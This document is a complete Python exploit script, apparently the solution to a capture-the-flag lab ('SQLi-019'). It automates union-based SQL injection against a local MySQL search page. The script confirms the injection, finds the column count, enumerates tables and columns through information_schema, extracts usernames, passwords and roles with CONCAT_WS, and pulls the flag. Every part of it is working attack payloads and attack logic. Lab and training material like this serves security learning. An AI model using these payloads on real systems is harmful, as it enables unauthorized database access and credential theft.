#!/usr/bin/env python3
"""
SQLi-019: MySQL Union-based Single Column Exploit
Automated exploitation script using CONCAT_WS technique
"""

import requests
import sys
from urllib.parse import quote

BASE_URL = "http://localhost:5019"

def inject(payload):
    """Send payload and return results"""
    url = f"{BASE_URL}/search?q={quote(payload)}"
    try:
        resp = requests.get(url, timeout=10)
        return resp.text
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def extract_results(html):
    """Extract result items from HTML response"""
    results = []
    start_marker = '<div class="result-item">'
    end_marker = '</div>'
    
    pos = 0
    while True:
        start = html.find(start_marker, pos)
        if start == -1:
            break
        start += len(start_marker)
        end = html.find(end_marker, start)
        if end == -1:
            break
        results.append(html[start:end].strip())
        pos = end + len(end_marker)
    
    return results

def main():
    print("=" * 60)
    print("SQLi-019: MySQL Union-based Single Column Exploit")
    print("=" * 60)
    
    # Step 1: Test injection
    print("\n[*] Step 1: Testing SQL Injection...")
    payload = "' OR '1'='1"
    html = inject(payload)
    if html and "result-item" in html:
        print("[+] SQL Injection confirmed!")
    else:
        print("[-] SQL Injection not working")
        sys.exit(1)
    
    # Step 2: Find column count
    print("\n[*] Step 2: Finding column count...")
    for i in range(1, 10):
        payload = f"' ORDER BY {i}-- -"
        html = inject(payload)
        if html and "error" in html.lower():
            print(f"[+] Column count: {i-1}")
            break
    
    # Step 3: Enumerate tables
    print("\n[*] Step 3: Enumerating tables...")
    payload = "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='ecommerce'-- -"
    html = inject(payload)
    tables = extract_results(html)
    print(f"[+] Tables found: {tables}")
    
    # Step 4: Enumerate columns in users table
    print("\n[*] Step 4: Enumerating users table columns...")
    payload = "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- -"
    html = inject(payload)
    columns = extract_results(html)
    print(f"[+] Columns in users: {columns}")
    
    # Step 5: Extract users with CONCAT_WS
    print("\n[*] Step 5: Extracting user credentials...")
    payload = "' UNION SELECT CONCAT_WS(':',username,password,role) FROM users-- -"
    html = inject(payload)
    users = extract_results(html)
    print("[+] Users found:")
    for user in users:
        if ':' in user:
            print(f"    {user}")
    
    # Step 6: Extract flag
    print("\n[*] Step 6: Extracting flag...")
    payload = "' UNION SELECT CONCAT_WS(':',name,value) FROM flags-- -"
    html = inject(payload)
    flags = extract_results(html)
    for flag in flags:
        if 'FLAG' in flag:
            parts = flag.split(':')
            if len(parts) >= 2:
                print(f"\n[+] FLAG FOUND: {parts[1]}")
                break
    
    print("\n" + "=" * 60)
    print("Exploitation completed!")
    print("=" * 60)

if __name__ == "__main__":
    main()
